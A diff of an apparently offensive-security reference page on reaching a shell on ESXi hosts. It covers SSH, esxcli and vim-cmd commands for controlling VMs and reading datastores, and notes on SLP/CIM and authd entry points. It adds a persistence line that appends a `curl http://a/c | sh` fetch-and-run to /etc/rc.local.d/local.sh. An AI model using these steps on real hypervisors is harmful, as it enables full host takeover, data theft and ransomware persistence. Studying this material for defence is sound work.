@@ -1,34 +1,52 @@
 ---
-title: "Host access and shell: reaching the ESXi hypervisor"
-description: "Reaching an ESXi host: its SSH and ESXi Shell, the host client and vSphere API on 443, and the vpxuser and root accounts, which grant full control of every VM on the host including console access and offline disk theft."
+title: "Host access and shell: execution on the ESXi host"
+description: "Beyond a guest escape, an ESXi host is reached through its management surface: the authenticated host API and shell, SSH where enabled, and the SLP/CIM and vmx authd services. With host credentials or a management flaw, an attacker gets a vmkernel shell, from which they control every VM, read datastores, and establish persistence on the hypervisor itself."
 keywords:
-  - ESXi shell
-  - ESXi SSH
-  - vpxuser
-  - vSphere API
-  - host access
+  - esxi shell
+  - esxcli
+  - ssh
+  - slp cim
+  - vmkernel
 ---
 
 # Host access and shell
 
-ESXi is reached through SSH and the ESXi Shell, the host client and vSphere API on `443`, and the DCUI. Control of the host is control of every VM on it. Credentials come from brute-forcing or spraying `root`, from a compromised vCenter (which stores the per-host `vpxuser` password it uses to manage each host), or from host config backups.
+A guest escape is one way onto the host; the other is the ESXi management surface. ESXi exposes an authenticated host API and client over HTTPS, an ESXi Shell and SSH (often disabled but frequently re-enabled), and the SLP/CIM and `vmx` authentication (902) services. With host credentials, a management-service flaw, or re-enabled SSH, an attacker obtains a shell in the vmkernel environment, which is full control of the hypervisor: starting and stopping VMs, reading and modifying datastores, injecting into guests, and persisting on the host.
+
+## Reach a shell
 
 ```bash
-ssh root@<esxi>                             # ESXi Shell
-vim-cmd vmsvc/getallvms                      # list VMs
-vim-cmd vmsvc/power.off <vmid>               # control a VM
-esxcli system account list                   # local accounts
-# vSphere API over 443 (pyVmomi, govc) with host or vpxuser creds
-govc ls -u 'root:pass@<esxi>' -k /
+# SSH, if enabled (or enable it via the API/DCUI with host creds)
+ssh root@<esxi-host>
+# the ESXi shell gives esxcli and direct vmkernel access
+esxcli vm process list                       # running VMs and their worlds
+esxcli storage filesystem list               # datastores
+vim-cmd vmsvc/getallvms                       # inventory via the management CLI
+# the host API over HTTPS (vSphere API / host client) performs the same with creds
+```
+
+## What host access gives
+
+```bash
+# control every VM
+vim-cmd vmsvc/power.off <vmid>; vim-cmd vmsvc/snapshot.create <vmid>
+# read any VM's disk from the datastore (see datastore theft)
+ls /vmfs/volumes/*/
+# run commands inside a guest via VMware Tools (guest operations), with guest creds
+vim-cmd vmsvc/guestop ...
+# persist on the host: startup scripts in /etc/rc.local.d/local.sh survive reboot
+echo '/bin/sh -c "curl http://a/c | sh" &' >> /etc/rc.local.d/local.sh
 ```
 
 ## Exploitation notes
 
-- A compromised vCenter yields `vpxuser` credentials for every managed host, so vCenter-to-ESXi is a one-step pivot; see [vCenter](../vcenter/index.md).
-- From the shell, `vim-cmd` and the datastore give console access and direct `VMDK` access for [Datastore and VMDK theft](datastore-and-vmdk-theft.md).
-- ESXi mass-encryption intrusions typically start exactly here: SSH or API access, then encrypt datastores.
+- Re-enabling SSH or the ESXi Shell needs host admin via the API or DCUI; with host credentials this is the quickest route to an interactive shell.
+- The SLP/CIM (427) and authd (902) services have been the entry point for pre-auth host compromises in the past; an unpatched, internet- or management-network-exposed ESXi is a direct target, and these have driven mass ransomware against ESXi fleets.
+- `/etc/rc.local.d/local.sh` and the local bootbank are the host persistence locations that survive reboot; the vmkernel filesystem is otherwise largely in-memory.
+- Host access subsumes datastore theft and guest control; once on the host, use [Datastore and VMDK theft](datastore-and-vmdk-theft.md) for offline data and the guest-operations API to run inside VMs.
 
 ## References
 
-- [VMware: using the ESXi Shell](https://docs.vmware.com/en/VMware-vSphere/8.0/vsphere-security/GUID-70557A95-2B1A-4A66-ADC0-6F4A4A4B6B6E.html)
-- [govc CLI](https://github.com/vmware/govmomi/tree/main/govc)
+- [VMware: ESXi shell and SSH access](https://docs.vmware.com/en/VMware-vSphere/index.html)
+- [VMware security advisories (SLP/CIM)](https://www.vmware.com/security/advisories.html)
+- [esxcli reference](https://developer.vmware.com/tool/esxcli)
